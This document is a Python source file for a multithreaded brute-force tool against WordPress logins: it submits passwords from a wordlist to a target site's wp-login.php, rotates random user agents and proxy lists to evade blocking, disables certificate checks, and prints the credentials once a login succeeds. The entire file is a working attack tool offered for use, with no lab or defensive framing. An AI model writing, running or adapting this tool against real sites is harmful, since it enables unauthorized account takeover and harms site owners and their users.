import os
import re
import ssl
import time
import random
import logging
import urllib.parse
import urllib.request

from pathlib import Path
from datetime import datetime
from argparse import FileType
from argparse import SUPPRESS
from argparse import ArgumentParser
from concurrent.futures import as_completed
from concurrent.futures import ThreadPoolExecutor

from userAgents import *


RED = '\u001b[31m'
GREEN = '\u001b[32m'
RESET = '\u001b[0m'

""" logger """
LOGGERNAME = Path(__file__).stem
logging.basicConfig(format="[%(asctime)s][%(levelname)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger(LOGGERNAME)
log.setLevel(logging.INFO)
logging.addLevelName(60, "SUCCESS")


def success(self, message, *args, **kws):
    if self.isEnabledFor(60):
        self._log(60, message, args, **kws)


logging.Logger.success = success
logging.addLevelName(70, "FAILED")


def failed(self, message, *args, **kws):
    if self.isEnabledFor(70):
        self._log(70, message, args, **kws)


logging.Logger.failed = failed

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE


def proxy(content):
    try:
        proxys = []
        content = content.readlines()
        for line in content:
            proxys.append(line.replace("\n", ""))
        return proxys
    except:
        return content


""" site masks """
def site_mask(url, mask):
    domain_pattern = re.compile(r"http[s]?://(.*?)/")
    domain = str(re.findall(domain_pattern, url)[0])

    if mask == "UPPER":
        masked_domain = domain.upper()
    elif mask == "LOWER":
        masked_domain = domain.lower()
    elif mask == "TITLE":
        masked_domain = domain.title()
    elif mask == "REVERSE":
        masked_domain = domain[::-1]
    elif mask == "UPPER-REVERSE":
        masked_domain = domain.upper()[::-1]
    elif mask == "LOWER-REVERSE":
        masked_domain = domain.lower()[::-1]
    elif mask == "TITLE-REVERSE":
        masked_domain = domain.title()[::-1]
    elif "MINUS" in mask:
        length = int(mask[-1:])
        masked_domain = domain[:-length]
    else:
        masked_domain = domain

    url = url.replace(domain, masked_domain)
    log.debug(f"Using site mask: {mask}")
    log.info(f"Url: {url}")
    return url


""" wordlist """
def pwd_mask(content, mask):
    lists = []
    content = content.readlines()
    for line in content:
        if mask == "UPPER":
            lists.append(line.replace("\n", "").upper())
        elif mask == "LOWER":
            lists.append(line.replace("\n", "").lower())
        elif mask == "TITLE":
            lists.append(line.replace("\n", "").title())
        elif mask == "REVERSE":
            lists.append(line.replace("\n", "")[::-1])
        elif mask == "UPPER-REVERSE":
            lists.append(line.replace("\n", "").upper()[::-1])
        elif mask == "LOWER-REVERSE":
            lists.append(line.replace("\n", "").lower()[::-1])
        elif mask == "TITLE-REVERSE":
            lists.append(line.replace("\n", "").title()[::-1])
        elif "MINUS" in mask:
            lists.append(line.replace("\n", "")[:-int(mask[-1:])])
        else:
            lists.append(line.replace("\n", ""))

    log.debug(f"Using wordlist mask: {mask}")
    return lists


""" login req """
def login(url, username, password, timeout, proxy):
    global userAgent

    url = urllib.parse.urljoin(url, "/wp-login.php/")
    form = f"log={username}&pwd={password}"
    form = bytes(form, "utf-8")

    headers = {
        "User-Agent": random.choice(userAgent),
        "Content-Type": "application/x-www-form-urlencoded"
    }

    request = urllib.request.Request(url, data=form, headers=headers)

    if proxy is not None:
        request.set_proxy(random.choice(proxy), "http") # change to https to add support

    with urllib.request.urlopen(request, timeout=timeout, context=context) as response:
        if re.search("wp-admin", response.url):
            return password
        else:
            log.debug("FAILED: {}:{}".format(username, password))
            return False


def brutforce(password, proxy):
    user = []
    log.info("Testing connection...")

    request = urllib.request.Request(args.url)
    urllib.request.urlopen(request, timeout=args.timeout, context=context)

    start_time = time.time()
    success_login = False

    if len(password) > 1:
        log.debug("Total data: " + str(len(password)) + " words")

    log.info("Starting Brute-force...")

    with ThreadPoolExecutor(max_workers=args.thread) as executor:
        
        url = site_mask(args.url, args.site_mask)
        processed = (executor.submit(login, url, args.usr, pwd, args.timeout, proxy) for pwd in password)
        for i, process in enumerate(as_completed(processed)):
            if len(password) > 1:
                    print("[{}][INFO] TESTING: {} password".format(datetime.now().strftime("%H:%M:%S") ,i), end="\r")

            process = process.result()
            if process is not False:
                success_login = True
                password = process
                break

        if success_login is True:
            log.success(GREEN + f"FOUND: {args.usr}:{password}" + RESET)
            os._exit(1)
        else:
            log.failed(RED + "NOT FOUND" + RESET)


if __name__ == "__main__":
    """ argument """
    parser = ArgumentParser(usage="python %(prog)s -t http://site.com/wp-login.php -u admin -P wordlist.txt [-v -m REVERSE --thread 8 ... ]")
    parser.add_argument("-c", "--cheatsheet", action="store_true", help="Output cheatsheet for mask")
    parser.add_argument("-v", "--verbose", action="store_const", const=logging.DEBUG, help="verbose mode")

    target = parser.add_argument_group("arguments")
    target.add_argument("-t", "--target", dest="url", metavar="", help="url of the target")
    target.add_argument("-m", "--mask", dest="mask", metavar="", default="None", help="Try -c/--cheatsheet more info")
    target.add_argument("-s", "--site-mask", dest="site_mask", metavar="", default="None", help="Cheatsheat similar to normal mask")
    target.add_argument("-u", "--username", dest="usr", metavar="", help="username of the target")
    target.add_argument("-p", "--password", dest="pwd", metavar="", help="password of the target")
    target.add_argument("-P", "--wpassword", dest="pwd_list",type=FileType('r', encoding="utf-8"), metavar="", help="using wordlist for passwords")
    
    request = parser.add_argument_group("other")
    request.add_argument("--timeout", metavar="", type=int, default=5, help="timed out for requests (default: %(default)s)")
    request.add_argument("--thread", metavar="", type=int, default=5, help="numbers of threading (default: %(default)s)")
    request.add_argument("--proxy", metavar="", help="using a proxy (ex: 127.0.0.1:8080)")
    request.add_argument("--proxy-list", dest="proxy_list", type=FileType('r', encoding="utf-8"), metavar="", help="using list with proxy (support: http, https)")
    args = parser.parse_args()

    if args.verbose:
        log.setLevel(args.verbose)

    if args.cheatsheet:
        print(cheatsheet)
        os._exit(1)

    if args.pwd:
        password = [args.pwd]
    elif args.pwd_list:
        log.info("Loading wordlist...")
        password = pwd_mask(args.pwd_list, args.mask)
    else:
        parser.error("Try --help or -h")

    if args.proxy_list:
        proxy = proxy(args.proxy_list)
    elif args.proxy:
        proxy = [args.proxy]
    else:
        proxy = None

    try:
        brutforce(password, proxy)
    except KeyboardInterrupt:
        print("\nBye!!!")
        os._exit(1)
    except:
        print("Something went wrong. Check your inputs :(")
